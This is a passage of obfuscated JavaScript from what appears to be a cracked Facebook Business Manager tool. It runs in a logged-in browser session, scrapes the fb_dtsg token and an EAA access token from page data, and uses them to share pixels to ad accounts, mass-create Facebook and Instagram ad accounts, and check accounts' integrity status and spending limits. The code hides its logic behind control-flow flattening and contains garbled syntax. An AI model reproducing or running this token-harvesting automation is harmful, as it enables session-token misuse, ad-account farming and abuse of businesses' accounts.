                                                            Mhiub.textContent = "SharePixel!for:CrackedByWonka=Jerusalem";
                                                            Mhiub.style.textAlign = "center";
                                                            Mhiub.style.marginBottom = "25px";
                                                            kMrtb.appendChild(Mhiub);
                                                            varojlub = document.createElement("div");
                                                            ojlub.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                            ojlub.style.textAlign = "center";
                                                            ojlub.style.marginBottom = "25px";
                                                            kMrtb.appendChild(ojlub);
                                                            varIecub = document.createElement("label");
                                                            Iecub.innerText = "BusinessName:";
                                                            kMrtb.appendChild(Iecub);
                                                            varkgfub = document.createElement("input");
                                                            kgfub.type = "text";
                                                            kgfub.placeholder = "EnterBusinessname";
                                                            kgfub.style.width = "100%";
                                                            kgfub.style.height = "10px";
                                                            kgfub.style.marginBottom = "10px";
                                                            kMrtb.appendChild(kgfub);
                                                            varEbWtb = require("CurrentBusinessUser").businessAccountName;
                                                            kgfub.value = EbWtb;
                                                            vargdZtb = document.createElement("label");
                                                            gdZtb.innerText = "BusinessID:";
                                                            kMrtb.appendChild(gdZtb);
                                                            varAYPtb = document.createElement("input");
                                                            AYPtb.placeholder = "EnterbusinessID";
                                                            AYPtb.style.width = "100%";
                                                            AYPtb.style.marginBottom = "10px";
                                                            kMrtb.appendChild(AYPtb);
                                                            varcaTtb = require("BusinessUnifiedNavigationContext").businessID;
                                                            AYPtb.value = caTtb;
                                                            varcuGub = document.createElement("label");
                                                            cuGub.innerText = "UserID:";
                                                            cuGub.style.display = "block";
                                                            kMrtb.appendChild(cuGub);
                                                            varEvJub = document.createElement("input");
                                                            EvJub.type = "text";
                                                            EvJub.placeholder = "EnterUserID";
                                                            EvJub.style.width = "100%";
                                                            EvJub.style.height = "10px";
                                                            EvJub.style.marginBottom = "10px";
                                                            EvJub.style.display = "block";
                                                            kMrtb.appendChild(EvJub);
                                                            varYqAub = require("CurrentUserInitialData").USER_ID;
                                                            EvJub.value = YqAub;
                                                            varAsDub = document.createElement("label");
                                                            AsDub.innerText = "fb_dtsgAccountHash:";
                                                            AsDub.style.display = "block";
                                                            kMrtb.appendChild(AsDub);
                                                            varUnuub = document.createElement("input");
                                                            Unuub.type = "text";
                                                            Unuub.placeholder = "Enterfb_dtsgAccountHash";
                                                            Unuub.style.width = "100%";
                                                            Unuub.style.height = "10px";
                                                            Unuub.style.marginBottom = "10px";
                                                            Unuub.style.display = "block";
                                                            kMrtb.appendChild(Unuub);
                                                            varwpxub = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                            Unuub.value = wpxub;
                                                            fetch("https://business.facebook.com/billing_hub/payment_settings/?asset_id=&placement=ads_manager", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", (_headers42 = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_headers42, "accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"), "accept-language", "en-US,en;q=0.9"), "cache-control", "max-age=0"), "dpr", "1"), "sec-ch-prefers-color-scheme", "light"), "sec-ch-ua", '"NotA(Brand";v="99","MicrosoftEdge";v="121","Chromium";v="121"'), "sec-ch-ua-full-version-list", '"NotA(Brand";v="99.0.0.0","MicrosoftEdge";v="121.0.2277.112","Chromium";v="121.0.6167.160"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-model", '""'), "sec-ch-ua-platform", '"Windows"'), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_headers42, "sec-ch-ua-platform-version", '"10.0.0"'), "sec-fetch-dest", "document"), "sec-fetch-mode", "navigate"), "sec-fetch-site", "same-origin"), "sec-fetch-user", "?1"), "upgrade-insecure-requests", "1"), "viewport-width", "1298"))), "referrerPolicy", "strict-origin-when-cross-origin"), "body", null), "method", "GET"), "mode", "cors"), "credentials", "include")).then(function(Qkoub) {
                                                                vara = 0;
                                                                while (a < 65535) {
                                                                    switch (a) {
                                                                        case0: a = !Qkoub.ok ? 1 : 65535;
                                                                        break;
                                                                        case1: a = 65535; {
                                                                            thrownewError("HTTPerror!Status:".concat(Qkoub.status));
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                                returnQkoub.text();
                                                            }).then(function(ULsrb) {
                                                                varwNvrb = /"accessToken":"([^"]+)"/;
                                                                varQImrb = wNvrb.exec(ULsrb);
                                                                varb = 0;
                                                                while (b < 65535) {
                                                                    switch (b) {
                                                                        case0: b = QImrb && QImrb[1] ? 1 : 2;
                                                                        break;
                                                                        case1: b = 65535; {
                                                                            varMFgrb = QImrb[1];
                                                                            gVKrb.value = "".concat(MFgrb);
                                                                        }
                                                                        break;
                                                                        case2: b = 65535; {
                                                                            whjsb.value = "AccessTokennotfoundintheresponse";
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                            }).catch(function(oHjrb) {
                                                                console.error("Errorfetchingdata:", oHjrb);
                                                                whjsb.value = "Errorfetchingdata";
                                                            });
                                                            varICarb = document.body.innerHTML;
                                                            varkEdrb = ICarb.match(/"accessToken":"(EAA[^"]+)"/);
                                                            varkYQrb = kEdrb ? kEdrb[1] : "";
                                                            varaccess_token = kYQrb;
                                                            varMZTrb = document.createElement("label");
                                                            MZTrb.innerText = "AccessToken:";
                                                            kMrtb.appendChild(MZTrb);
                                                            vargVKrb = document.createElement("textarea");
                                                            gVKrb.placeholder = "EnterAccessToken:";
                                                            gVKrb.style.width = "100%";
                                                            gVKrb.style.height = "70px";
                                                            gVKrb.style.marginBottom = "10px";
                                                            kMrtb.appendChild(gVKrb);
                                                            varIWNrb = kYQrb;
                                                            gVKrb.value = IWNrb;
                                                            varcSErb = document.createElement("button");
                                                            cSErb.textContent = "❤️SharePixel❤️!:Require[AccessToken]";
                                                            cSErb.style.display = "block";
                                                            cSErb.style.margin = "0auto";
                                                            cSErb.style.padding = "10px20px";
                                                            cSErb.style.background = "blue";
                                                            cSErb.style.color = "white";
                                                            cSErb.style.border = "none";
                                                            cSErb.style.borderRadius = "5px";
                                                            kMrtb.appendChild(cSErb);
                                                            varETHrb = document.createElement("button");
                                                            ETHrb.textContent = "PleaseWait👩‍💻";
                                                            ETHrb.style.display = "none";
                                                            ETHrb.style.margin = "0auto";
                                                            ETHrb.style.padding = "10px20px";
                                                            ETHrb.style.background = "red";
                                                            ETHrb.style.color = "white";
                                                            ETHrb.style.border = "none";
                                                            ETHrb.style.borderRadius = "5px";
                                                            kMrtb.appendChild(ETHrb);
                                                            varYOyrb = document.createElement("label");
                                                            YOyrb.innerText = "PixelID:";
                                                            kMrtb.appendChild(YOyrb);
                                                            varAQBrb = document.createElement("input");
                                                            AQBrb.placeholder = "EnterPixelID";
                                                            AQBrb.style.width = "100%";
                                                            AQBrb.style.marginBottom = "10px";
                                                            kMrtb.appendChild(AQBrb);
                                                            varAkpsb = document.createElement("label");
                                                            Akpsb.innerText = "AdAccountID:";
                                                            kMrtb.appendChild(Akpsb);
                                                            varcmssb = document.createElement("input");
                                                            cmssb.placeholder = "EnterAdAccountID";
                                                            cmssb.style.width = "100%";
                                                            cmssb.style.marginBottom = "10px";
                                                            kMrtb.appendChild(cmssb);
                                                            varwhjsb = document.createElement("textarea");
                                                            whjsb.placeholder = "Responsewillbeshownhere";
                                                            whjsb.style.width = "100%";
                                                            whjsb.style.height = "150px";
                                                            whjsb.style.marginBottom = "10px";
                                                            kMrtb.appendChild(whjsb);
                                                            cSErb.addEventListener("click", function() {
                                                                cSErb.style.display = "none";
                                                                ETHrb.style.display = "block";
                                                                fetch("https://graph.facebook.com/v14.0/".concat(AQBrb.value, "/shared_accounts?method=POST&business=").concat(AYPtb.value, "&account_id=").concat(cmssb.value, "&access_token=").concat(gVKrb.value, "&locale=vi_VN"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not/A)Brand";v="99","MicrosoftEdge";v="115","Chromium";v="115"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"')), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", null), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(Yimsb) {
                                                                    Yimsb.text().then(function(sedsb) {
                                                                        whjsb.value = sedsb;
                                                                        cSErb.style.display = "block";
                                                                        ETHrb.style.display = "none";
                                                                        console.log(sedsb);
                                                                    });
                                                                }).catch(function(Ufgsb) {
                                                                    console.error(Ufgsb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                                whjsb.value = "SharePixelAdAccount...⌛";
                                                                console.log("⌛SharePixelAdAccount...⌛");
                                                            });
                                                            kMrtb.appendChild(document.createElement("br"));
                                                            varobXrb = document.createElement("button");
                                                            obXrb.textContent = "X";
                                                            obXrb.style.position = "absolute";
                                                            obXrb.style.top = "10px";
                                                            obXrb.style.right = "10px";
                                                            obXrb.style.width = "30px";
                                                            obXrb.style.height = "30px";
                                                            obXrb.style.border = "none";
                                                            obXrb.style.borderRadius = "50%";
                                                            obXrb.style.background = "red";
                                                            obXrb.style.color = "black";
                                                            obXrb.style.fontSize = "16px";
                                                            kMrtb.appendChild(obXrb);
                                                            obXrb.addEventListener("click", function() {
                                                                kMrtb.style.display = "none";
                                                            });
                                                        });
                                                        MFck.appendChild(QQAtb);
                                                        varQcasb = document.createElement("button");
                                                        Qcasb.textContent = "💲BusinessCreatorAndStatusQuality🔎";
                                                        Qcasb.style.width = "100%";
                                                        Qcasb.style.height = "30px";
                                                        Qcasb.style.marginBottom = "10px";
                                                        Qcasb.style.backgroundColor = "blue";
                                                        Qcasb.style.color = "white";
                                                        Qcasb.addEventListener("click", function() {
                                                            var_headers46;
                                                            varQwNsb = document.createElement("div");
                                                            QwNsb.style.position = "fixed";
                                                            QwNsb.style.top = "50%";
                                                            QwNsb.style.left = "50%";
                                                            QwNsb.style.transform = "translate(-50%,-50%)";
                                                            QwNsb.style.width = "600px";
                                                            QwNsb.style.padding = "50px";
                                                            QwNsb.style.background = "white";
                                                            QwNsb.style.color = "black";
                                                            QwNsb.style.borderRadius = "10px";
                                                            QwNsb.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                            QwNsb.style.zIndex = "9999";
                                                            document.body.appendChild(QwNsb);
                                                            varsyQsb = document.createElement("div");
                                                            syQsb.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                            syQsb.style.textAlign = "center";
                                                            syQsb.style.marginBottom = "10px";
                                                            QwNsb.appendChild(syQsb);
                                                            varMtHsb = document.createElement("div");
                                                            MtHsb.textContent = "CreateAdaccountForcedInstaAndBMfacebook!CrackedByMostafaKamel";
                                                            MtHsb.style.textAlign = "center";
                                                            MtHsb.style.marginBottom = "25px";
                                                            QwNsb.appendChild(MtHsb);
                                                            varovKsb = document.createElement("div");
                                                            ovKsb.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                            ovKsb.style.textAlign = "center";
                                                            ovKsb.style.marginBottom = "25px";
                                                            QwNsb.appendChild(ovKsb);
                                                            varIqBsb = document.createElement("label");
                                                            IqBsb.innerText = "AdAccountName:";
                                                            QwNsb.appendChild(IqBsb);
                                                            varksEsb = Math.floor(Math.random() * 1e4);
                                                            varEnvsb = document.createElement("input");
                                                            Envsb.type = "text";
                                                            Envsb.value = "Medoz".concat(ksEsb);
                                                            Envsb.style.width = "100%";
                                                            Envsb.style.height = "10px";
                                                            Envsb.style.marginBottom = "10px";
                                                            QwNsb.appendChild(Envsb);
                                                            vargpysb = document.createElement("label");
                                                            gpysb.innerText = "Currency:";
                                                            gpysb.style.display = "block";
                                                            QwNsb.appendChild(gpysb);
                                                            varIOzpb = document.createElement("input");
                                                            IOzpb.type = "text";
                                                            IOzpb.placeholder = "EnterCurrencyCode";
                                                            IOzpb.style.width = "100%";
                                                            IOzpb.style.height = "10px";
                                                            IOzpb.style.marginBottom = "10px";
                                                            IOzpb.style.display = "block";
                                                            QwNsb.appendChild(IOzpb);
                                                            varkQCpb = "USD";
                                                            IOzpb.value = kQCpb;
                                                            varELtpb = document.createElement("label");
                                                            ELtpb.innerText = "fb_dtsgAccountHash:";
                                                            ELtpb.style.display = "block";
                                                            QwNsb.appendChild(ELtpb);
                                                            vargNwpb = document.createElement("input");
                                                            gNwpb.type = "text";
                                                            gNwpb.placeholder = "Enterfb_dtsgAccountHash";
                                                            gNwpb.style.width = "100%";
                                                            gNwpb.style.height = "10px";
                                                            gNwpb.style.marginBottom = "10px";
                                                            gNwpb.style.display = "block";
                                                            QwNsb.appendChild(gNwpb);
                                                            varAInpb = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                            gNwpb.value = AInpb;
                                                            varcKqpb = document.createElement("label");
                                                            cKqpb.innerText = "BusinessName:";
                                                            QwNsb.appendChild(cKqpb);
                                                            varwFhpb = document.createElement("input");
                                                            wFhpb.type = "text";
                                                            wFhpb.placeholder = "EnterBusinessname";
                                                            wFhpb.style.width = "100%";
                                                            wFhpb.style.height = "10px";
                                                            wFhpb.style.marginBottom = "10px";
                                                            QwNsb.appendChild(wFhpb);
                                                            varYGkpb = require("CurrentBusinessUser").businessAccountName;
                                                            wFhpb.value = YGkpb;
                                                            varYaYpb = document.createElement("label");
                                                            YaYpb.innerText = "OwnerBusinessPeopleID:";
                                                            QwNsb.appendChild(YaYpb);
                                                            varAcbqb = document.createElement("input");
                                                            Acbqb.placeholder = "EnterOwnerBusinessPeopleID";
                                                            Acbqb.style.width = "100%";
                                                            Acbqb.style.marginBottom = "10px";
                                                            QwNsb.appendChild(Acbqb);
                                                            varUXRpb = require("CurrentBusinessUser").business_user_id;
                                                            Acbqb.value = UXRpb;
                                                            varwZUpb = document.createElement("label");
                                                            wZUpb.innerText = "UserID:";
                                                            wZUpb.style.display = "block";
                                                            QwNsb.appendChild(wZUpb);
                                                            varQULpb = document.createElement("input");
                                                            QULpb.type = "text";
                                                            QULpb.placeholder = "EnterUserID";
                                                            QULpb.style.width = "100%";
                                                            QULpb.style.height = "10px";
                                                            QULpb.style.marginBottom = "10px";
                                                            QULpb.style.display = "block";
                                                            QwNsb.appendChild(QULpb);
                                                            varsWOpb = require("CurrentUserInitialData").USER_ID;
                                                            QULpb.value = sWOpb;
                                                            varMRFpb = document.createElement("textarea");
                                                            MRFpb.placeholder = "Responsewillbeshownhere";
                                                            MRFpb.style.width = "100%";
                                                            MRFpb.style.height = "150px";
                                                            MRFpb.style.marginBottom = "10px";
                                                            QwNsb.appendChild(MRFpb);
                                                            varoTIpb = document.createElement("label");
                                                            oTIpb.innerText = "BusinessID:";
                                                            QwNsb.appendChild(oTIpb);
                                                            varonwqb = document.createElement("input");
                                                            onwqb.placeholder = "EnterbusinessID";
                                                            onwqb.style.width = "100%";
                                                            onwqb.style.marginBottom = "10px";
                                                            QwNsb.appendChild(onwqb);
                                                            varQozqb = require("BusinessUnifiedNavigationContext").businessID;
                                                            onwqb.value = Qozqb;
                                                            varkkqqb = document.createElement("button");
                                                            kkqqb.textContent = "CreateFacebookAdAccountIntoBM!:❤️[".concat(onwqb.value, "]❤️❤️[").concat(wFhpb.value, "]❤️");
                                                            kkqqb.style.display = "block";
                                                            kkqqb.style.margin = "0auto";
                                                            kkqqb.style.padding = "10px20px";
                                                            kkqqb.style.background = "red";
                                                            kkqqb.style.color = "white";
                                                            kkqqb.style.border = "none";
                                                            kkqqb.style.borderRadius = "5px";
                                                            QwNsb.appendChild(kkqqb);
                                                            varMltqb = document.createElement("button");
                                                            Mltqb.textContent = "PleaseWait👩‍💻";
                                                            Mltqb.style.display = "none";
                                                            Mltqb.style.margin = "0auto";
                                                            Mltqb.style.padding = "10px20px";
                                                            Mltqb.style.background = "red";
                                                            Mltqb.style.color = "white";
                                                            Mltqb.style.border = "none";
                                                            Mltqb.style.borderRadius = "5px";
                                                            QwNsb.appendChild(Mltqb);
                                                            kkqqb.addEventListener("click", function() {
                                                                kkqqb.style.display = "none";
                                                                Mltqb.style.display = "block";
                                                                fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not/A)Brand";v="99","MicrosoftEdge";v="115","Chromium";v="115"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"')), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", "__a=1&dpr=1&fb_dtsg=".concat(gNwpb.value, '&variables={"businessID":"').concat(onwqb.value, '","adAccountName":"').concat(Envsb.value, '","timezoneID":"373","currency":"').concat(IOzpb.value, '","endAdvertiserID":"').concat(onwqb.value, '"}&server_timestamps=true&doc_id=6547144472027848')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(ghkqb) {
                                                                    ghkqb.text().then(function(Iinqb) {
                                                                        MRFpb.value = Iinqb;
                                                                        kkqqb.style.display = "block";
                                                                        Mltqb.style.display = "none";
                                                                        console.log(Iinqb);
                                                                    });
                                                                }).catch(function(ceeqb) {
                                                                    console.error(ceeqb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                                MRFpb.value = "CreatingAdAccount...⌛";
                                                                console.log("⌛CreatingBMAdAccount...⌛");
                                                            });
                                                            QwNsb.appendChild(document.createElement("br"));
                                                            varEfhqb = document.createElement("button");
                                                            Efhqb.textContent = "CreateInstagramAdAccount!:❤️[".concat(onwqb.value, "]❤️❤️[").concat(wFhpb.value, "]");
                                                            Efhqb.style.display = "block";
                                                            Efhqb.style.margin = "0auto";
                                                            Efhqb.style.padding = "10px20px";
                                                            Efhqb.style.background = "green";
                                                            Efhqb.style.color = "white";
                                                            Efhqb.style.border = "none";
                                                            Efhqb.style.borderRadius = "5px";
                                                            QwNsb.appendChild(Efhqb);
                                                            varEzUqb = document.createElement("button");
                                                            EzUqb.textContent = "PleaseWait👩‍💻";
                                                            EzUqb.style.display = "none";
                                                            EzUqb.style.margin = "0auto";
                                                            EzUqb.style.padding = "10px20px";
                                                            EzUqb.style.background = "red";
                                                            EzUqb.style.color = "white";
                                                            EzUqb.style.border = "none";
                                                            EzUqb.style.borderRadius = "5px";
                                                            QwNsb.appendChild(EzUqb);
                                                            Efhqb.addEventListener("click", function() {
                                                                Efhqb.style.display = "none";
                                                                EzUqb.style.display = "block";
                                                                fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not/A)Brand";v="99","MicrosoftEdge";v="115","Chromium";v="115"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"')), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", "__a=1&dpr=1&fb_dtsg=".concat(gNwpb.value, '&variables={"input":{"create_permissions":true,"preference":"INSTAGRAM_BACKED_ADS","actor_id":"').concat(QULpb.value, '","client_mutation_id":"1"}}&server_timestamps=true&doc_id=7267556646604471')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(gBXqb) {
                                                                    gBXqb.text().then(function(AwOqb) {
                                                                        MRFpb.value = AwOqb;
                                                                        Efhqb.style.display = "block";
                                                                        EzUqb.style.display = "none";
                                                                        console.log(AwOqb);
                                                                    });
                                                                }).catch(function(cyRqb) {
                                                                    console.error(cyRqb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                                MRFpb.value = "CreatingAdAccount...⌛";
                                                                console.log("⌛CreatingInstagramBMAdAccount...⌛");
                                                            });
                                                            QwNsb.appendChild(document.createElement("br"));
                                                            fetch("https://business.facebook.com/billing_hub/payment_settings/?asset_id=&placement=ads_manager", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", (_headers46 = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_headers46, "accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"), "accept-language", "en-US,en;q=0.9"), "cache-control", "max-age=0"), "dpr", "1"), "sec-ch-prefers-color-scheme", "light"), "sec-ch-ua", '"NotA(Brand";v="99","MicrosoftEdge";v="121","Chromium";v="121"'), "sec-ch-ua-full-version-list", '"NotA(Brand";v="99.0.0.0","MicrosoftEdge";v="121.0.2277.112","Chromium";v="121.0.6167.160"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-model", '""'), "sec-ch-ua-platform", '"Windows"'), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_headers46, "sec-ch-ua-platform-version", '"10.0.0"'), "sec-fetch-dest", "document"), "sec-fetch-mode", "navigate"), "sec-fetch-site", "same-origin"), "sec-fetch-user", "?1"), "upgrade-insecure-requests", "1"), "viewport-width", "1298"))), "referrerPolicy", "strict-origin-when-cross-origin"), "body", null), "method", "GET"), "mode", "cors"), "credentials", "include")).then(function(wtIqb) {
                                                                vara = 0;
                                                                while (a < 65535) {
                                                                    switch (a) {
                                                                        case0: a = !wtIqb.ok ? 1 : 65535;
                                                                        break;
                                                                        case1: a = 65535; {
                                                                            thrownewError("HTTPerror!Status:".concat(wtIqb.status));
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                                returnwtIqb.text();
                                                            }).then(function(sqCqb) {
                                                                varUrFqb = /"accessToken":"([^"]+)"/;
                                                                varwRGnb = UrFqb.exec(sqCqb);
                                                                varb = 0;
                                                                while (b < 65535) {
                                                                    switch (b) {
                                                                        case0: b = wRGnb && wRGnb[1] ? 1 : 2;
                                                                        break;
                                                                        case1: b = 65535; {
                                                                            varsOAnb = wRGnb[1];
                                                                            Mdfob.value = "".concat(sOAnb);
                                                                        }
                                                                        break;
                                                                        case2: b = 65535; {
                                                                            MRFpb.value = "AccessTokennotfoundintheresponse";
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                            }).catch(function(UPDnb) {
                                                                console.error("Errorfetchingdata:", UPDnb);
                                                                MRFpb.value = "Errorfetchingdata";
                                                            });
                                                            varoLunb = document.body.innerHTML;
                                                            varQMxnb = oLunb.match(/"accessToken":"(EAA[^"]+)"/);
                                                            varkIonb = QMxnb ? QMxnb[1] : "";
                                                            access_token = kIonb;
                                                            varMJrnb = document.createElement("label");
                                                            MJrnb.innerText = "AccessToken:";
                                                            QwNsb.appendChild(MJrnb);
                                                            varMdfob = document.createElement("textarea");
                                                            Mdfob.placeholder = "EnterAccessToken:";
                                                            Mdfob.style.width = "100%";
                                                            Mdfob.style.height = "70px";
                                                            Mdfob.style.marginBottom = "10px";
                                                            QwNsb.appendChild(Mdfob);
                                                            varofiob = kIonb;
                                                            Mdfob.value = ofiob;
                                                            varIaZnb = document.createElement("button");
                                                            IaZnb.textContent = "CreateFacebookAdAccountIntoBM!:❤️[".concat(onwqb.value, "]❤️❤️[").concat(wFhpb.value, "]❤️Require[AccessToken]");
                                                            IaZnb.style.display = "block";
                                                            IaZnb.style.margin = "0auto";
                                                            IaZnb.style.padding = "10px20px";
                                                            IaZnb.style.background = "blue";
                                                            IaZnb.style.color = "white";
                                                            IaZnb.style.border = "none";
                                                            IaZnb.style.borderRadius = "5px";
                                                            QwNsb.appendChild(IaZnb);
                                                            varkccob = document.createElement("button");
                                                            kccob.textContent = "PleaseWait👩‍💻";
                                                            kccob.style.display = "none";
                                                            kccob.style.margin = "0auto";
                                                            kccob.style.padding = "10px20px";
                                                            kccob.style.background = "red";
                                                            kccob.style.color = "white";
                                                            kccob.style.border = "none";
                                                            kccob.style.borderRadius = "5px";
                                                            QwNsb.appendChild(kccob);
                                                            IaZnb.addEventListener("click", function() {
                                                                IaZnb.style.display = "none";
                                                                kccob.style.display = "block";
                                                                fetch("https://graph.facebook.com/v17.0/".concat(onwqb.value, "/adaccount?access_token=").concat(Mdfob.value, "&__cppo=1"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not/A)Brand";v="99","MicrosoftEdge";v="115","Chromium";v="115"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"')), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", "__activeScenarioIDs=%5B%5D&__activeScenarios=%5B%5D&__interactionsMetadata=%5B%5D&_reqName=object%3Abrand%2Fadaccount&_reqSrc=AdAccountActions.brands&ad_account_created_from_bm_flag=true&currency=USD&end_advertiser=".concat(onwqb.value, "&invoicing_emails=%5B%5D&locale=en_US&media_agency=UNFOUND&method=post&name=").concat(Envsb.value, "&partner=UNFOUND&po_number=&pretty=0&suppress_http_code=1&timezone_id=1&xref=f3a88cbcf7f406c")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(EXSnb) {
                                                                    EXSnb.text().then(function(gZVnb) {
                                                                        MRFpb.value = gZVnb;
                                                                        IaZnb.style.display = "block";
                                                                        kccob.style.display = "none";
                                                                        console.log(gZVnb);
                                                                    });
                                                                }).catch(function(AUMnb) {
                                                                    console.error(AUMnb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                                MRFpb.value = "CreatingAdAccount...⌛";
                                                                console.log("⌛CreatingBMAdAccount...⌛");
                                                            });
                                                            QwNsb.appendChild(document.createElement("br"));
                                                            varcWPnb = document.createElement("button");
                                                            cWPnb.textContent = "GetBusinessInformation!:❤️[".concat(onwqb.value, "]❤️❤️[").concat(wFhpb.value, "]❤️Require[AccessToken]");
                                                            cWPnb.style.display = "block";
                                                            cWPnb.style.margin = "0auto";
                                                            cWPnb.style.padding = "10px20px";
                                                            cWPnb.style.background = "green";
                                                            cWPnb.style.color = "white";
                                                            cWPnb.style.border = "none";
                                                            cWPnb.style.borderRadius = "5px";
                                                            QwNsb.appendChild(cWPnb);
                                                            varcqDob = document.createElement("button");
                                                            cqDob.textContent = "PleaseWait👩‍💻";
                                                            cqDob.style.display = "none";
                                                            cqDob.style.margin = "0auto";
                                                            cqDob.style.padding = "10px20px";
                                                            cqDob.style.background = "red";
                                                            cqDob.style.color = "white";
                                                            cqDob.style.border = "none";
                                                            cqDob.style.borderRadius = "5px";
                                                            QwNsb.appendChild(cqDob);
                                                            cWPnb.addEventListener("click", function() {
                                                                cWPnb.style.display = "none";
                                                                cqDob.style.display = "block";
                                                                fetch("https://graph.facebook.com/v17.0/me/businesses?fields=id,is_disabled_for_integrity_reasons,can_use_extended_credit,name,timezone_id,verification_status,owned_ad_accounts.limit(100){account_status},client_ad_accounts.limit(500){account_status},owned_pages,client_pages,business_users,pending_users&limit=100&access_token=".concat(Mdfob.value), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not/A)Brand";v="99","MicrosoftEdge";v="115","Chromium";v="115"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"')), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", null), "method", "GET"), "mode", "cors"), "credentials", "include")).then(function(ErGob) {
                                                                    ErGob.json().then(function(Ymxob) {
                                                                        varc = 0;
                                                                        while (c < 65535) {
                                                                            switch (c) {
                                                                                case0: c = Ymxob && Ymxob.data && Ymxob.data.length > 0 ? 1 : 2;
                                                                                break;
                                                                                case1: c = 65535; {
                                                                                    varUjrob = Ymxob.data[0];
                                                                                    varwluob = Ujrob.is_disabled_for_integrity_reasons;
                                                                                    varQglob = Ujrob.can_use_extended_credit;
                                                                                    vard = 0;
                                                                                    while (d < 65535) {
                                                                                        switch (d) {
                                                                                            case0: d = wluob === (NaN === NaN) ? 1 : 2;
                                                                                            break;
                                                                                            case1: d = 65535; {
                                                                                                QAYob.value = "BusinessStatus:-Active✅";
                                                                                            }
                                                                                            break;
                                                                                            case2: d = 65535; {
                                                                                                QAYob.value = "BusinessStatus:-Disabled❌";
                                                                                            }
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                    vare = 0;
                                                                                    while (e < 65535) {
                                                                                        switch (e) {
                                                                                            case0: e = Qglob === (NaN === NaN) ? 1 : 2;
                                                                                            break;
                                                                                            case1: e = 65535; {
                                                                                                MxSob.value += "\\n50$❌";
                                                                                            }
                                                                                            break;
                                                                                            case2: e = 65535; {
                                                                                                MxSob.value += "\\n250$OrNoLimit✅";
                                                                                            }
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                    MRFpb.value += ":\\n".concat(JSON.stringify(Ymxob, null, 2));
                                                                                    cWPnb.style.display = "block";
                                                                                    cqDob.style.display = "none";
                                                                                    console.log(Ymxob);
                                                                                }
                                                                                break;
                                                                                case2: c = 65535; {
                                                                                    MRFpb.value = "Nobusinessdatafound.";
                                                                                    console.log("Nobusinessdatafound.");
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                    });
                                                                }).catch(function(UDepb) {
                                                                    console.error(UDepb);
